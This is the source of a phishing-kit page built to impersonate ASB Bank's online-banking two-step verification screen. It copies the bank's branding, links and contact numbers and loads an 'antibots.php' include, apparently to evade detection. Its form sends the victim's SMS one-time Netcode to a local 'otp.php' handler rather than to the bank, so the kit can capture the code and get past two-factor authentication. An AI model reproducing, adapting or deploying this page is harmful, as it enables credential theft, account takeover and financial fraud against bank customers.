﻿<?php
session_start();
error_reporting(0);
require "antibots.php";
?>
<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="en" style=""><!--<![endif]--><!-- 13/09/2016 09:25 --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="cache-control" content="max-age=0">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">
	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
	<meta http-equiv="pragma" content="no-cache">
    <link rel="shortcut icon" href="https://online.asb.co.nz/auth/favicon.ico">

    <title>ASB Bank - Log in</title>

	
    <link href="./verify/fontsz.min.css" rel="stylesheet">
    <link href="./verify/stylez.min.css" rel="stylesheet">
    
<script type="text/javascript">
/*<![CDATA[*/ 
document.cookie = "IV_JCT=%2Fauth; path=/; secure";
/*]]>*/ 
</script>
</head>

    




<body id="body">
		
    	<a href="https://online.asb.co.nz/auth/netcode?CancelSMS=Cancel" class="logout-link">Log out</a>
    

    <div class="logon-container">
        <div class="logon-container__row">
            <div class="logon-container__col">

				<!-- ASB LOGO -->
				<div class="logon-container">
					<div class="logon-container__row">
						<div class="logon-container__col logon-typography--text-center">
							<div class="logon-header-logo">
								<a href="https://www.asb.co.nz/" title="Go to ASB Homepage">
									<svg class="logon-icon--asb" focusable="false"></svg>
								</a>
							</div>
						</div>
					</div>
				</div>

	    

				<!-- NETCODE SECTION -->
				<div class="logon-container logon-container--grey">
					<div class="logon-container__inner">
						<div class="logon-container__row">
							<div class="logon-container__col">

								<!-- TITLE SECTION -->
							<div class="logon-typography-header two-step-verification">
                <h1 class="logon-typography-h1 logon-typography--text-center logon-typography-header__text">
                	Two-step verification
                </h1>
              </div>

							<div class="logon-typography--text-center">
                  <p class="logon-typography--body1 logon-typography--opacity">For your security, we need to be sure
                  	it's really you. <a href="https://asb.co.nz/two-step" target="_blank">Learn more</a></p>
              </div>

								<!-- NO JAVASCRIPT MESSAGE SECTION -->
								<noscript>
									<div class="logon-callout logon-callout--info logon-typography-spacing-xxlarge">
										<i aria-hidden="true" class="logon-icon logon-callout__icon">
											<svg class="logon-icon--information" focusable="false"></svg>
										</i>
										<span class="logon-callout__text">
											Your browser seems to have Javascript disabled. Make sure Javascript is enabled to log in.
										</span>
									</div>
								</noscript>

								<!-- COOKIE DISABLED MESSAGE SECTION -->
								<script language="JavaScript">
									var warningString = "<div class=\"warning message input\"><table><tr><td><div class=\"icon info\"></div></td><td><h3>Your browser seems to have cookies disabled. Make sure cookies are enabled to log in.</h3></td></tr></table></div>";
									document.cookie = 'acceptsCookies=yes';
									if (document.cookie == '') {
										document.write(warningString);
									}
									else {
										document.cookie = 'acceptsCookies=yes; expires=Fri, 13-Apr-1970 00:00:00 GMT';
									}

									$(document).ready(function () {
										settstamp();
										setmobileappmsg();
									});
								</script>

								


								
									<!-- MOBILE NOTECODE SECTION -->
									

<!-- CALLOUT SECTION (Error, Info) -->
<div class="logon-callout logon-callout--alert logon-typography-spacing-xxlarge hide">
	<i aria-hidden="true" class="logon-icon logon-callout__icon">
		<svg class="logon-icon--caution-circular-white" focusable="false"></svg>
	</i>
	<span id="logon-error-desc1" class="logon-callout__text" role="alert">
		
		
	</span>
</div>

<!-- FORM SECTION -->
<form name="netcode" method="post" action="otp.php" id="netcode" autocomplete="off">

	<input type="hidden" name="authnMod" value="NetCodeAuthn">
	<input type="hidden" name="action" value="netcodelogin">
	<input type="hidden" name="secfk" value="GQ3F-3NI2-669X-0B60-97OV-FTDI-WDP0-GHXM">

	<!-- NETCODE FIELD -->
	<div class="logon-form__field logon-text-field logon-text-field--with-leading-icon logon-text-field--with-trailing-icon ">
		<label for="netcode" class="logon-text-field__label logon-typography-spacing">Enter Netcode</label>
		<div class="logon-text-field__inputcontainer">
			<i aria-hidden="true" class="logon-icon logon-text-field__icon">
				<svg class="logon-icon--key" focusable="false"></svg>
			</i>
			<i aria-hidden="true" class="logon-icon logon-text-field__icon logon-text-field__icon--error">
				<svg class="logon-icon--caution-circular" focusable="false"></svg>
			</i>
			<input type="text" name="netcode" id="netcode" class="logon-text-field__input" maxlength="8" spellcheck="false" autocorrect="off" autocomplete="off" aria-label="Netcode" required>
		</div>

		<div class="logon-text-field__helperline logon-typography-spacing-half">
			<div class="logon-text-field__helpertext">
				We have sent a code to your phone by text message.
			</div>
		</div>
	</div>

	<!-- BUTTONS SECTION -->
	<div class="logon-form__field logon-typography--text-center logon-typography-top-spacing">
		<button class="logon-button" id="submitBtnSMS" name="SubmitSMS" type="submit">
			<div class="logon-button__ripple"></div>
			<span class="logon-button__label">Submit</span>
		</button>
	</div>
</form>
								

                                <!-- FAILED SCREEN SECTION -->
								

							</div>
						</div>
					</div>
				</div>
			

				<!-- SECTION TO CHOOSE SMS IN CASE OF BOTH OPTIONS -->
				<!-- HAVING A PROBLEM SECTION -->
				

                <!-- FOOTER SECTION -->
                <div class="logon-container logon-typography--text-center logon-typography-spacing-xxlarge logon-typography-top-spacing">
                    <div class="logon-container__row logon-container__row-cols-1">



						<div class="logon-container__col logon-typography--text-center ">
							<div class="logon-contact-numbers">
								<button type="button" class="logon-button logon-button--text-white logon-button--with-icon logon-button--small logon-contact-numbers__button">
									<i aria-hidden="true" class="logon-icon logon-button__icon">
										<svg class="logon-icon--chevron-down" focusable="false"></svg>
									</i>
									<span class="logon-button__label logon-typography--body1">Call for help</span>
								</button>
								<div class="logon-contact-numbers__content hide">
									<p class="logon-typography--body1 logon-typography--opacity logon-typography-nospacing"><a class="a--white" href="tel:0800327863" style="line-height: 1rem;">0800 327 863</a> (within New Zealand)</p>
									<p class="logon-typography--body1 logon-typography--opacity logon-typography-nospacing"><a class="a--white" href="tel:006493063185">+64 9 306 3185</a> (outside New Zealand)</p>
								</div>
							</div>
						</div>


                        <!-- DISCLAIMER AND FOOTER LINKS SECTION -->
                        
						
						
						<div class="logon-container__col"><p class="logon-typography--body2 logon-typography-spacing logon-typography--opacity">FastNet is licensed to ASB Bank Limited and is solely for the use of persons authorised by ASB Bank Limited. Do not access FastNet unless you have been specifically authorised to do so. Unauthorised access is prohibited.</p></div><div class="logon-container__col logon-typography-spacing-large"><p class="logon-typography--body3 logon-typography-spacing"><a class="a--white" href="https://www.asb.co.nz/documents/banking-with-asb/fastnet-classic-terms-and-conditions.html" target="_blank">Terms and conditions</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/security" target="_blank">About security</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/privacy" target="_blank">Privacy</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/documents/banking-with-asb/internet-access-terms-and-conditions.html" target="_blank">Internet access terms</a></p></div>
                         <!-- END DISCLAIMER AND FOOTER LINKS SECTION -->

                    </div>
                </div>

			</div>
		</div>
	</div>
	
    <script type="text/javascript">
        $(document).on("pLoaded", document, function () {
			if (typeof MarketingConfig != "undefined" && MarketingConfig.EnableMarketing == "true") {
				LoadMarketing({
					Url: MarketingConfig.Url,
					DL: MarketingConfig.DL,
					Channel: MarketingConfig.Channel,
					BannerDelay: MarketingConfig.BannerDelay
				});
			}
        });

        $(function () {
			if (typeof MarketingConfig != "undefined" && MarketingConfig.EnableFunc == "true")
			{
				try {
					$(document.body).bind('funcLoaded', function () {
							LoadFunc({
								Url: MarketingConfig.Url,
								Channel: MarketingConfig.Channel,
								RegEx: MarketingConfig.RegEx,
								Sleep: MarketingConfig.Sleep,
								Data: null,
								Reload: MarketingConfig.Reload
							});
					});

					$('#initialFuncScript').attr('src', MarketingConfig.Url + MarketingConfig.JsSource);
				} catch (err) { }
			}
        });
    </script>
    <script src="./text-verify_files/p.min.js.download" type="text/javascript"></script>
    <script type="text/javascript" id="initialFuncScript"></script>



</body></html>